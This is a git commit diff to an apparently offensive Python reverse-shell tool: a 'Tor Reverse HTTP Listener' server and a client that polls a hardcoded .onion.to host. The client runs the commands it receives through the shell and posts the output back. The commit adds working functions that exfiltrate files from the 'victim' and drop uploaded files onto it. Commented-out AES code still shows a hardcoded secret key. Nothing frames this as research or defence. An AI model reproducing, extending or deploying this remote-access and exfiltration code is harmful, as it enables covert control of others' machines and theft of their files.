bfd7795b559855d61b1f83ca8e42922558d75e33
j0lly <jos.ferraris@gmail.com>
2015-10-04 15:27:51 +0100

    upload & download added

--- server.py
+++ server.py
@@ -19,27 +19,28 @@ import urlparse
 import re
 import os
 import base64
-from Crypto.Cipher import AES
+import binascii
+import tempfile
 
-# the block size for the cipher object; must be 16, 24, or 32 for AES
-BLOCK_SIZE = 32
-# the character used for padding--with a block cipher such as AES, the value
-# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
-# used to ensure that your value is always a multiple of BLOCK_SIZE
-PADDING = '{'
-# one-liner to sufficiently pad the text to be encrypted
-pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
-
-# one-liners to encrypt/encode and decrypt/decode a string
-# encrypt with AES, encode with base64
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-
-# 32 character secret key - change this if you want to be unique
-secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
-
-# create a cipher object using the random secret
-cipher = AES.new(secret)
+## the block size for the cipher object; must be 16, 24, or 32 for AES
+#BLOCK_SIZE = 32
+## the character used for padding--with a block cipher such as AES, the value
+## you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
+## used to ensure that your value is always a multiple of BLOCK_SIZE
+#PADDING = '{'
+## one-liner to sufficiently pad the text to be encrypted
+#pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+#
+## one-liners to encrypt/encode and decrypt/decode a string
+## encrypt with AES, encode with base64
+#EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+#DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+#
+## 32 character secret key - change this if you want to be unique
+#secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
+#
+## create a cipher object using the random secret
+#cipher = AES.new(secret)
 
 # url decode for postbacks
 def htc(m):
@@ -52,7 +53,32 @@ def urldecode(url):
 
 class GetHandler(BaseHTTPRequestHandler):
 
-	# handle get request
+        # save downloaded file to disk
+        def download_file(self,file_contents):
+                if file_contents != "":
+                    fd, tmpPayload = tempfile.mkstemp(prefix="repythor")
+                    os.close(fd)
+                    print "Saving file to %s ..." % tmpPayload
+                    fd=open(tmpPayload,'w')
+                    fd.write(binascii.unhexlify(file_contents))
+                    fd.close()
+
+                else: print "file does not exist"
+
+        def upload_file(self,doc):
+                if doc=="":
+                    print "We need a file as a parameter"
+                else:
+                    print "trying to upload %s" % doc
+                    if not os.path.isfile(doc):
+                        print "%s does not exist" % doc
+                    else:
+                        fd=open(doc,'rb')
+                        file_contents=fd.read()
+                        fd.close()
+                        return binascii.hexlify(file_contents)
+
+        # handle get request
 	def do_GET(self):
 
 		# this will be our shell command
@@ -63,6 +89,8 @@ class GetHandler(BaseHTTPRequestHandler):
         	self.end_headers()
 #		# encrypt the message
 #		message = EncodeAES(cipher, message)
+                if message[0:6] == "upload" :
+                    message = "upload %s" % self.upload_file(message[7:])
 		# base64 it
 		message = base64.b64encode(message)
 		# write our command shell param to victim
@@ -83,14 +111,30 @@ class GetHandler(BaseHTTPRequestHandler):
                 qs = self.rfile.read(length)
 		# url decode
                 url=urldecode(qs)
-                # remove the parameter cmd
-                url=url.replace("cmd=", "")
-		# base64 decode
-		message = base64.b64decode(url)
+                if url[0:4] == "cmd=" :
+                    # remove the parameter cmd
+                    url=url.replace("cmd=", "")
+		    # base64 decode
+		    message = base64.b64decode(url)
+		    # display the command back decrypted
+		    print message
+                elif url[0:4] == "dwl=" :
+                    print 'Downloading.. '
+                    url=url.replace("dwl=", "")
+		    # base64 decode
+		    message = base64.b64decode(url)
+                    self.download_file(message)
+                elif url[0:4] == "upl=" :
+                    print 'Uploading.. '
+                    url=url.replace("upl=", "")
+		    # base64 decode
+		    message = base64.b64decode(url)
+                    if message == "" :
+                        print "Error uploading file"
+                    else :
+                        print "File uploaded to %s" % binascii.unhexlify(message)
 #		# decrypt the string
 #		message = DecodeAES(cipher, message)
-		# display the command back decrypted
-		print message
 
 if __name__ == '__main__':
 
@@ -99,18 +143,17 @@ if __name__ == '__main__':
 	print """############################################
 #
 #
-# AES Encrypted Reverse HTTP Listener by:
+# Tor Reverse HTTP Listener by:
 #
-#        Dave Kennedy (ReL1K)
-#     http://www.secmaniac.com
+#        j0lly
 #
 #
 ############################################"""
-    	print 'Starting encrypted web shell server, use <Ctrl-C> to stop'
+    	print 'Starting Tor web shell server, use <Ctrl-C> to stop'
 	# simple try block
 	try:
 		# serve and listen forever
 	    	server.serve_forever()
 	# handle keyboard interrupts
 	except KeyboardInterrupt:
-		print "[!] Exiting the encrypted webserver shell.. hack the gibson."
+		print "[!] Exiting the webserver shell.. "
--- shell.py
+++ shell.py
@@ -20,34 +20,51 @@ import subprocess
 import sys
 import base64
 import os
-from Crypto.Cipher import AES
+import binascii
+import tempfile
 
-
-# the block size for the cipher object; must be 16, 24, or 32 for AES
-BLOCK_SIZE = 32
-# the character used for padding--with a block cipher such as AES, the value
-# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
-# used to ensure that your value is always a multiple of BLOCK_SIZE
-PADDING = '{'
-# one-liner to sufficiently pad the text to be encrypted
-pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
-
-# one-liners to encrypt/encode and decrypt/decode a string
-# encrypt with AES, encode with base64
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-
-# secret key, change this if you want to be unique
-secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
+## the block size for the cipher object; must be 16, 24, or 32 for AES
+#BLOCK_SIZE = 32
+## the character used for padding--with a block cipher such as AES, the value
+## you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
+## used to ensure that your value is always a multiple of BLOCK_SIZE
+#PADDING = '{'
+## one-liner to sufficiently pad the text to be encrypted
+#pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+#
+## one-liners to encrypt/encode and decrypt/decode a string
+## encrypt with AES, encode with base64
+#EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+#DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+#
+## secret key, change this if you want to be unique
+#secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
+#
+## create a cipher object using the random secret
+#cipher = AES.new(secret)
 
 # set our basic headers
 headers = {"User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)","Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
-
-# create a cipher object using the random secret
-cipher = AES.new(secret)
-
 # YOUR TOR SERVER
 server = "gx32knlxeynsijug.onion.to"
+
+def send_file(doc):
+        if  os.path.isfile(doc):
+                fd=open(doc,'rb')
+                data=fd.read()
+                fd.close()
+                return binascii.hexlify(data)
+        else: return ""
+
+def write_file(doc):
+        if doc != "":
+                fd, tmpPayload = tempfile.mkstemp(prefix="repytor")
+                os.close(fd)
+                fd=open(tmpPayload,'w')
+                fd.write(binascii.unhexlify(doc))
+                fd.close()
+                return binascii.hexlify(tmpPayload)
+        else: return ""
 
 # loop forever
 while 1:
@@ -63,16 +80,30 @@ while 1:
 	# quit out if we receive that command
 	if message == "quit" or message == "exit":
                 sys.exit()
-	# issue the shell command we want
-	proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-	# read out the data of stdout
-	data = proc.stdout.read() + proc.stderr.read()
+        elif message[0:8] == "download" :
+            print "Download %s" % message[9:]
+            data = send_file(message[9:len(message)])
+	    # base64 encode the data
+	    data = base64.b64encode(data)
+	    # urlencode the data from stdout
+	    data = urllib.urlencode({'dwl': '%s'}) % (data)
+        elif message[0:6] == "upload" :
+            data = write_file(message[7:len(message)])
+	    # base64 encode the data
+	    data = base64.b64encode(data)
+	    # urlencode the data from stdout
+	    data = urllib.urlencode({'upl': '%s'}) % (data)
+        else :
+	    # issue the shell command we want
+	    proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	    # read out the data of stdout
+	    data = proc.stdout.read() + proc.stderr.read()
+	    # base64 encode the data
+	    data = base64.b64encode(data)
+	    # urlencode the data from stdout
+	    data = urllib.urlencode({'cmd': '%s'}) % (data)
 #	# encrypt the data
 #	data = EncodeAES(cipher, data)
-	# base64 encode the data
-	data = base64.b64encode(data)
-	# urlencode the data from stdout
-	data = urllib.urlencode({'cmd': '%s'}) % (data)
 	# who we want to connect back to with the shell
 	h = httplib.HTTPSConnection(server)
 	# actually post the data
